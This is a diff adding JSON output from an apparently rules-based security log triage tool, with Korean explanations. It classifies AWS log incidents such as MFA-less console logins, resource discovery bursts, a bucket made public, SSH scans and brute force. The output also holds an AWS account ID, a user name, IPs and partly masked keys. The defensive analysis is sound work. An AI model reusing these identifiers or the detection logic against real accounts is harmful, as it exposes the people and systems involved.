+    "reason": "운영체제 명령 삽입 시도. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-006",
+    "evidence": [
+     "alb.log:8"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "운영체제 명령 삽입 시도. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-007",
+    "evidence": [
+     "access.log:858"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "운영체제 명령 삽입 시도. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-008",
+    "evidence": [
+     "cloudtrail.json:1181",
+     "cloudtrail.json:1186",
+     "cloudtrail.json:1188",
+     "cloudtrail.json:1189",
+     "cloudtrail.json:1191",
+     "cloudtrail.json:1192"
+    ],
+    "verdict": "attack",
+    "confidence": "high",
+    "reason": "MFA 없는 콘솔 로그인, 계정·자원 목록 조회 연속 실행. 결과: 성공 8건."
+   },
+   {
+    "id": "INC-009",
+    "evidence": [
+     "guardduty_findings.jsonl:1",
+     "vpcflow.log:59569",
+     "vpcflow.log:157004"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-012",
+    "evidence": [
+     "vpcflow.log:27077",
+     "vpcflow.log:27089",
+     "vpcflow.log:27115",
+     "vpcflow.log:27130",
+     "vpcflow.log:27176",
+     "vpcflow.log:124512"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-015",
+    "evidence": [
+     "cloudtrail.json:6037",
+     "cloudtrail.json:6038",
+     "cloudtrail.json:6039",
+     "cloudtrail.json:6041",
+     "cloudtrail.json:6089",
+     "cloudtrail.json:6090"
+    ],
+    "verdict": "attack",
+    "confidence": "medium",
+    "reason": "계정·자원 목록 조회 연속 실행. 결과: 성공 60건."
+   },
+   {
+    "id": "INC-016",
+    "evidence": [
+     "vpcflow.log:26567",
+     "vpcflow.log:124002",
+     "vpcflow.log:28616",
+     "vpcflow.log:126051",
+     "vpcflow.log:30205",
+     "vpcflow.log:127640"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-017",
+    "evidence": [
+     "vpcflow.log:17818",
+     "vpcflow.log:17856",
+     "vpcflow.log:19948",
+     "vpcflow.log:115253",
+     "vpcflow.log:115291",
+     "vpcflow.log:117383"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-019",
+    "evidence": [
+     "vpcflow.log:36272",
+     "vpcflow.log:133707",
+     "vpcflow.log:41833",
+     "vpcflow.log:139268",
+     "vpcflow.log:42262",
+     "vpcflow.log:139697"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-018",
+    "evidence": [
+     "vpcflow.log:26693",
+     "vpcflow.log:124128",
+     "vpcflow.log:28113",
+     "vpcflow.log:125548",
+     "vpcflow.log:30135",
+     "vpcflow.log:127570"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-020",
+    "evidence": [
+     "vpcflow.log:83625",
+     "vpcflow.log:83660",
+     "vpcflow.log:181060",
+     "vpcflow.log:181095",
+     "vpcflow.log:83739",
+     "vpcflow.log:181174"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-022",
+    "evidence": [
+     "vpcflow.log:27619",
+     "vpcflow.log:125054",
+     "vpcflow.log:30039",
+     "vpcflow.log:127474"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-023",
+    "evidence": [
+     "vpcflow.log:27960",
+     "vpcflow.log:125395",
+     "vpcflow.log:29491",
+     "vpcflow.log:126926"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-025",
+    "evidence": [
+     "vpcflow.log:66078",
+     "vpcflow.log:66137",
+     "vpcflow.log:163513",
+     "vpcflow.log:163572"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-026",
+    "evidence": [
+     "vpcflow.log:84059",
+     "vpcflow.log:181494",
+     "vpcflow.log:84646",
+     "vpcflow.log:182081"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-021",
+    "evidence": [
+     "vpcflow.log:25202",
+     "vpcflow.log:122637",
+     "vpcflow.log:25101",
+     "vpcflow.log:122536"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-024",
+    "evidence": [
+     "vpcflow.log:30696",
+     "vpcflow.log:30740",
+     "vpcflow.log:128131",
+     "vpcflow.log:128175"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-027",
+    "evidence": [
+     "vpcflow.log:5280",
+     "vpcflow.log:102715"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-028",
+    "evidence": [
+     "vpcflow.log:9297",
+     "vpcflow.log:106732"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-030",
+    "evidence": [
+     "vpcflow.log:21069",
+     "vpcflow.log:118504"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-031",
+    "evidence": [
+     "vpcflow.log:23098",
+     "vpcflow.log:120533"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-033",
+    "evidence": [
+     "vpcflow.log:25144",
+     "vpcflow.log:122579"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-034",
+    "evidence": [
+     "vpcflow.log:27230",
+     "vpcflow.log:124665"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-035",
+    "evidence": [
+     "vpcflow.log:26966",
+     "vpcflow.log:124401"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-038",
+    "evidence": [
+     "vpcflow.log:30066",
+     "vpcflow.log:127501"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-040",
+    "evidence": [
+     "vpcflow.log:32192",
+     "vpcflow.log:129627"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-043",
+    "evidence": [
+     "vpcflow.log:34977",
+     "vpcflow.log:132412"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-045",
+    "evidence": [
+     "vpcflow.log:39893",
+     "vpcflow.log:137328"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-046",
+    "evidence": [
+     "vpcflow.log:45529",
+     "vpcflow.log:142964"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-048",
+    "evidence": [
+     "vpcflow.log:46753",
+     "vpcflow.log:144188"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-049",
+    "evidence": [
+     "vpcflow.log:46982",
+     "vpcflow.log:144417"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-050",
+    "evidence": [
+     "vpcflow.log:52005",
+     "vpcflow.log:149440"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-052",
+    "evidence": [
+     "vpcflow.log:58591",
+     "vpcflow.log:156026"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-053",
+    "evidence": [
+     "vpcflow.log:58708",
+     "vpcflow.log:156143"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-054",
+    "evidence": [
+     "vpcflow.log:61681",
+     "vpcflow.log:159116"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-057",
+    "evidence": [
+     "vpcflow.log:76232",
+     "vpcflow.log:173667"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-059",
+    "evidence": [
+     "vpcflow.log:76243",
+     "vpcflow.log:173678"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-060",
+    "evidence": [
+     "vpcflow.log:76297",
+     "vpcflow.log:173732"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-061",
+    "evidence": [
+     "vpcflow.log:81036",
+     "vpcflow.log:178471"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-029",
+    "evidence": [
+     "vpcflow.log:85946",
+     "vpcflow.log:88147"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-047",
+    "evidence": [
+     "vpcflow.log:45834",
+     "vpcflow.log:143269"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-051",
+    "evidence": [
+     "vpcflow.log:57960",
+     "vpcflow.log:155395"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-055",
+    "evidence": [
+     "vpcflow.log:61174",
+     "vpcflow.log:158609"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-062",
+    "evidence": [
+     "vpcflow.log:81853",
+     "vpcflow.log:179288"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-064",
+    "evidence": [
+     "vpcflow.log:88867"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-068",
+    "evidence": [
+     "auth.log:229"
+    ],
+    "verdict": "attack",
+    "confidence": "medium",
+    "reason": "서버에 새 계정 생성·관리자 그룹 추가. 결과: 성공 1건."
+   },
+   {
+    "id": "INC-069",
+    "evidence": [
+     "auth.log:284",
+     "auth.log:288",
+     "auth.log:292",
+     "auth.log:296",
+     "auth.log:300",
+     "auth.log:304"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "SSH 비밀번호 연속 실패(무차별 대입). 보이는 시도 11건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-070",
+    "evidence": [
+     "access.log:226"
+    ],
+    "verdict": "attack",
+    "confidence": "medium",
+    "reason": "취약점 스캐너·자동 도구 탐지. 결과: 통과 1건. 연결 허용·요청 통과는 있지만 공격이 성공한 근거는 아직 없습니다."
+   }
+  ],
+  "campaigns": [
+   {
+    "incident_ids": [
+     "INC-001",
+     "INC-002"
+    ],
+    "link_reason": "같은 IP, 같은 액세스 키",
+    "summary": "공격 의심 사건 2개 (INC-001, INC-002)"
+   },
+   {
+    "incident_ids": [
+     "INC-003"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-004"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-005"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-006"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-007"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-008"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-015"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   }
+  ],
+  "cannot_tell": [
+   "WAF 로그가 없어 웹 공격 요청이 막혔는지는 웹서버 로그로 일부만 볼 수 있습니다.",
+   "ALB 로그는 08-20 14:37 UTC(한국 23:37)에 끝나고, 같은 기간의 다른 로그는 08-20 15:26 UTC(한국 00:26)까지 있습니다. 그 사이의 ALB 기록은 없습니다.",
+   "GuardDuty 로그는 08-20 13:50 UTC(한국 22:50)에 끝나고, 같은 기간의 다른 로그는 08-20 15:26 UTC(한국 00:26)까지 있습니다. 그 사이의 GuardDuty 기록은 없습니다."
+  ],
+  "coverage": {
+   "sources": {
+    "alb": {
+     "n_events": 2051,
+     "first": "2018-08-20T09:24:18.626121+00:00",
+     "last": "2018-08-20T14:37:02.756539+00:00"
+    },
+    "cloudtrail": {
+     "n_events": 6571,
+     "first": "2018-08-20T09:00:00+00:00",
+     "last": "2018-08-20T15:15:20+00:00"
+    },
+    "guardduty": {
+     "n_events": 1,
+     "first": "2018-08-20T13:50:05+00:00",
+     "last": "2018-08-20T13:50:05+00:00"
+    },
+    "sshauth": {
+     "n_events": 65,
+     "first": "2018-08-20T09:08:51+00:00",
+     "last": "2018-08-20T15:08:12+00:00"
+    },
+    "vpcflow": {
+     "n_events": 183296,
+     "first": "2018-08-20T09:00:13+00:00",
+     "last": "2018-08-20T15:26:46+00:00"
+    },
+    "weblog": {
+     "n_events": 3907,
+     "first": "2018-08-20T09:04:13+00:00",
+     "last": "2018-08-20T15:17:39+00:00"
+    }
+   },
+   "missing_sources": [
+    "waf"
+   ],
+   "cloudtrail_s3_object_calls": 0,
+   "suspected_keys": []
+  },
+  "validation": {
+   "passed": true,
+   "note": "규칙 판정은 입력 ref만 씁니다"
+  },
+  "meta": {
+   "model": "rules",
+   "usage": {}
+  }
+ },
+ "n_known": 0,
+ "explain_mode": {
+  "report": "rules",
+  "models": [],
+  "triage": "rules",
+  "triage_model": null,
+  "ai_errors": []
+ },
+ "results": [
+  {
+   "incident": {
+    "start": "2018-08-20T13:01:28+00:00",
+    "end": "2018-08-20T14:20:54+00:00",
+    "severity": "high",
+    "score": 404,
+    "stages": [
+     "discovery",
+     "initial-access",
+     "exfiltration"
+    ],
+    "src_ips": [
+     "107.77.212.175"
+    ],
+    "instances": [],
+    "actors": [
+     "arn:aws:iam::622676721278:user/bstoll"
+    ],
+    "sources": [
+     "cloudtrail"
+    ],
+    "n_events": 98,
+    "n_known": 0,
+    "known_labels": [],
+    "findings": [
+     {
+      "rule": "CT_CONSOLE_NO_MFA",
+      "technique": "T1078.004",
+      "stage": "initial-access",
+      "title": "MFA 없는 콘솔 로그인",
+      "severity": "low",
+      "detail": "4건(성공 4, 실패·거부 0)",
+      "key": "arn:aws:iam::622676721278:user/bstoll",
+      "first": "2018-08-20T13:57:22+00:00",
+      "last": "2018-08-20T14:06:36+00:00",
+      "n_events": 2,
+      "evidence": [
+       "cloudtrail.json:4856",
+       "cloudtrail.json:5258"
+      ]
+     },
+     {
+      "rule": "CT_DISCOVERY_BURST",
+      "technique": "T1580",
+      "stage": "discovery",
+      "title": "계정·자원 목록 조회 연속 실행",
+      "severity": "medium",
+      "detail": "10분 안에 조회 API 7종",
+      "key": "107.77.212.175",
+      "first": "2018-08-20T13:01:28+00:00",
+      "last": "2018-08-20T13:33:02+00:00",
+      "n_events": 83,
+      "evidence": [
+       "cloudtrail.json:3662",
+       "cloudtrail.json:3663",
+       "cloudtrail.json:3664",
+       "cloudtrail.json:3665",
+       "cloudtrail.json:3666",
+       "cloudtrail.json:3667",
+       "cloudtrail.json:3668",
+       "cloudtrail.json:3669",
+       "cloudtrail.json:3670",
+       "cloudtrail.json:3671",
+       "cloudtrail.json:3672",
+       "cloudtrail.json:3673",
+       "cloudtrail.json:3674",
+       "cloudtrail.json:3675",
+       "cloudtrail.json:3676",
+       "cloudtrail.json:3677",
+       "cloudtrail.json:3678",
+       "cloudtrail.json:3679",
+       "cloudtrail.json:3680",
+       "cloudtrail.json:3683"
+      ]
+     },
+     {
+      "rule": "CT_S3_PUBLIC",
+      "technique": "T1537",
+      "stage": "exfiltration",
+      "title": "S3 버킷을 인터넷 전체 또는 다른 계정에 공개(ACL·정책)",
+      "severity": "high",
+      "detail": "1건(성공 1, 실패·거부 0)",
+      "key": "arn:aws:iam::622676721278:user/bstoll",
+      "first": "2018-08-20T13:01:46+00:00",
+      "last": "2018-08-20T13:01:46+00:00",
+      "n_events": 1,
+      "evidence": [
+       "cloudtrail.json:3703"
+      ]
+     },
+     {
+      "rule": "CT_DISCOVERY_BURST",
+      "technique": "T1580",
+      "stage": "discovery",
+      "title": "계정·자원 목록 조회 연속 실행",
+      "severity": "medium",
+      "detail": "10분 안에 조회 API 4종",
+      "key": "107.77.212.175",
+      "first": "2018-08-20T14:19:30+00:00",
+      "last": "2018-08-20T14:20:54+00:00",
+      "n_events": 12,
+      "evidence": [
+       "cloudtrail.json:5467",
+       "cloudtrail.json:5470",
+       "cloudtrail.json:5477",
+       "cloudtrail.json:5485",
+       "cloudtrail.json:5488",
+       "cloudtrail.json:5492",
+       "cloudtrail.json:5502",
+       "cloudtrail.json:5510",
+       "cloudtrail.json:5525",
+       "cloudtrail.json:5533",
+       "cloudtrail.json:5538",
+       "cloudtrail.json:5539"
+      ]
+     }
+    ],
+    "events": [
+     {
+      "ref": "cloudtrail.json:3662",
+      "ts": "2018-08-20T13:01:28+00:00",
+      "source": "cloudtrail",
+      "action": "s3:ListBuckets",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********TZGQ",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:3663",
+      "ts": "2018-08-20T13:01:31+00:00",
+      "source": "cloudtrail",
+      "action": "s3:GetBucketPolicy",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********WYL3",
+      "errorCode": "NoSuchBucketPolicy",
+      "params": "{\"policy\": [\"\"], \"bucketName\": \"config-bucket-622676721278\"}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:3664",
+      "ts": "2018-08-20T13:01:31+00:00",
+      "source": "cloudtrail",
+      "action": "s3:GetBucketAcl",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********WYL3",
